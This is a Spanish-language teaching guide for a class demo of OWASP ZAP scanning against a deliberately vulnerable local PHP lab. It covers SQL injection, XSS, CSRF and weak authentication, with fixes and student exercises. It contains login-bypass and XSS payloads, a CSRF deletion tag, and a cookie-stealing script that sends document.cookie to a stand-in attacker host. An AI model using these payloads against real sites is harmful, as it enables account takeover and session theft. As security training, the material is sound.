# 🎓 Guía para Presentación en Clase

## 📋 Timeline (70 minutos)

---

## 🎯 1. Introducción (5 min)

### Escenario 4 vs Escenario 2

| Aspecto | Escenario 2 |
|---------|-------------|
| **Tipo** | DAST (Dinámico) |
| **Descripción** | DAST es un análisis de seguridad que se realiza sobre una aplicación en ejecución, simulando ataques reales desde el exterior. |
| **Herramienta** | OWASP ZAP |
| **Analiza** | App ejecutándose |
| **Cuándo** | Post-despliegue |

---

## 💻 2. Demo Aplicación (5 min)

### Mostrar Funcionalidades

```
http://localhost/lab_seguridad

1. Página principal → Presentación
2. Login → admin / admin123
3. Usuarios → CRUD completo
4. Productos → CRUD con comentarios
```

### Señalar Vulnerabilidades Obvias

- ✋ "Vean que las contraseñas están visibles en la tabla"
- ✋ "No hay validación en los formularios"
- ✋ "Los errores SQL se muestran al usuario"

---

## 🔍 3. OWASP ZAP (5 min)

### Cómo Funciona

```
1. SPIDER → Descubre todas las páginas
2. PASSIVE SCAN → Analiza sin atacar
3. ACTIVE SCAN → Prueba exploits reales
4. REPORT → Documenta hallazgos
```

---

## ⚡ 4. Análisis con ZAP (10 min)

### Ejecutar Scan

```
1. Abrir OWASP ZAP
2. Quick Start → http://localhost/lab_seguridad
3. Clic en "Attack"
4. Esperar ~2-3 minutos (demo rápido)
5. Mostrar "Alerts"
```

### Resultados Demo

```
🔴 High:     6 vulnerabilidades
🟠 Medium:   4 vulnerabilidades  
🟡 Low:      8 vulnerabilidades
────────────────────────────────
Total:       18 hallazgos
```

**Nota:** Pre-ejecutar scan completo antes de clase, guardar sesión

---

## 🚨 5. Vulnerabilidades Críticas (20 min)

### A. SQL Injection 🔴

**Código vulnerable:**
```php
$username = $_POST['username'];
$query = "SELECT * FROM usuarios WHERE username = '$username'";
```

**Proque es vulnerable:** Sin sanitización, permite inyección directa.
**Que es sanitización:** Es el proceso de limpiar y validar datos de entrada para evitar ataques.

**Demo en vivo:**
```
Login:
Usuario: ' OR '1'='1
Password: cualquier_cosa
→ ¡Acceso concedido sin credenciales!
```

**Explicación:**
```sql
-- Query inyectada:
SELECT * FROM usuarios WHERE username = '' OR '1'='1' AND ...
-- Resultado: Siempre TRUE
```

**Impacto:** Control total de la BD, bypass de autenticación

---

### B. XSS Reflejado 🔴

**Descripción:** El XSS reflejado se produce cuando los datos proporcionados por el usuario se reflejan en la respuesta del servidor sin la debida validación o escape.

**Código vulnerable:**
```php
$search = $_GET['search'];
echo "<p>Resultados: $search</p>";
```

**Proque es vulnerable:** Sin escape, permite inyección de scripts.
**Que es escape:** Es el proceso de convertir caracteres especiales en entidades HTML para evitar la ejecución de scripts.

**Demo en vivo:**
```
Búsqueda:
<script>alert('XSS')</script>
→ ¡Popup ejecutado!
```

**Payload real:**
```javascript
<script>
  fetch('http://attacker.com/steal?c=' + document.cookie);
</script>
```

**Impacto:** Robo de sesiones, phishing, keylogging

---

### C. XSS Almacenado 🔴

**Descripción:** El XSS almacenado ocurre cuando los datos maliciosos se guardan en el servidor (por ejemplo, en una base de datos) y se muestran a otros usuarios sin la debida validación o escape.

**Diferencia:** Afecta a **TODOS** los usuarios, no solo al atacante

**Demo en vivo:**
```
Crear producto:
Descripción: <img src=x onerror="alert('XSS')">
→ Guardar
→ Cada vez que alguien vea el producto, ejecuta el script
```

**Impacto:** Ataque persistente a todos los visitantes

---

### D. CSRF 🟠

**Descripción:** El CSRF (Cross-Site Request Forgery) es un tipo de ataque que fuerza al navegador a ejecutar acciones no deseadas en una aplicación web en la que el usuario está autenticado.

**¿Qué es?** Fuerza al navegador a ejecutar acciones no deseadas

**Código vulnerable:**
```php
// Sin token CSRF
if (isset($_GET['delete'])) {
    $id = $_GET['delete'];
    mysqli_query($conn, "DELETE FROM usuarios WHERE id = $id");
}
```

**Porque es vulnerable:** No verifica el origen de la solicitud.

**Ataque conceptual:**
```html
<!-- Sitio malicioso -->
<img src="http://localhost/lab_seguridad/usuarios.php?delete=1">
```

**Impacto:** Acciones no autorizadas

---

### E. Broken Authentication 🟠

**Problemas:**
1. ❌ Passwords sin hash (texto plano)
2. ❌ Sesiones sin expiración
3. ❌ Cookies sin HttpOnly/Secure flags

**HttpOnly:** Evita acceso JS a cookies  
**Secure:** Solo envía cookies sobre HTTPS

**Demo:** Mostrar tabla de usuarios con passwords visibles

**Impacto:** Robo de credenciales, secuestro de sesión

---

## ✅ 6. Correcciones (10 min)

### SQL Injection → Prepared Statements

**Antes:**
```php
$query = "SELECT * FROM usuarios WHERE username = '$username'";
```

**Después:**
```php
$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE username = ?");
$stmt->execute([$username]);
```

---

### XSS → htmlspecialchars()

**Antes:**
```php
echo "<p>$search</p>";
```

**Después:**
```php
$safe = htmlspecialchars($search, ENT_QUOTES, 'UTF-8');
echo "<p>$safe</p>";
```

---

### CSRF → Tokens

**Antes:**
```php
<form method="POST">
    <input name="username">
</form>
```

**Después:**
```php
// Generar
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Formulario
<form method="POST">
    <input type="hidden" name="csrf_token" 
           value="<?= $_SESSION['csrf_token'] ?>">
    <input name="username">
</form>

// Validar
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF inválido');
}
```

---

### Passwords → password_hash()

**Antes:**
```php
$password = $_POST['password'];
// Guardar en texto plano
```

**Después:**
```php
$hash = password_hash($_POST['password'], PASSWORD_BCRYPT);
// Guardar $hash

// Verificar
if (password_verify($input, $stored_hash)) {
    // Login exitoso
}
```

---

## 📊 7. Comparativa (5 min)

### Antes vs Después

| Severidad | Antes | Después | Reducción |
|-----------|-------|---------|-----------|
| 🔴 Critical | 6 | 0 | **100%** |
| 🟠 High | 4 | 1 | **75%** |
| 🟡 Medium | 8 | 2 | **75%** |
| **TOTAL** | **18** | **3** | **83%** |

**Gráfico visual:**
```
Vulnerabilidades Críticas:
Antes:  ██████ (6)
Después: ∅ (0)
```

---

## 🎓 8. Ejercicios Prácticos (10 min)

### Ejercicio 1: SQL Injection

**Tarea:** Bypassear el login sin credenciales

**Payloads a probar:**
- `' OR '1'='1`
- `admin' --`
- `' OR 1=1 --`

**Pregunta:** ¿Por qué funciona?

---

### Ejercicio 2: XSS

**Tarea:** Ejecutar JavaScript en la búsqueda

**Payloads:**
- `<script>alert('XSS')</script>`
- `<img src=x onerror="alert(1)">`
- `<svg onload="alert('XSS')">`

**Bonus:** ¿Cómo robarías las cookies?

---

## 🎉 Conclusión

### Mensajes Clave

1. ✅ **Automatización es clave** - ZAP es muy efectivo
2. ✅ **OWASP Top 10 sigue vigente** - Vulnerabilidades comunes
3. ✅ **Seguridad desde el inicio** - No es un agregado
4. ✅ **Testing regular** - Análisis continuo

### Recursos

- 📚 https://www.zaproxy.org/
- 📚 https://owasp.org/www-project-top-ten/
- 📚 https://portswigger.net/web-security
- 📚 DVWA para práctica
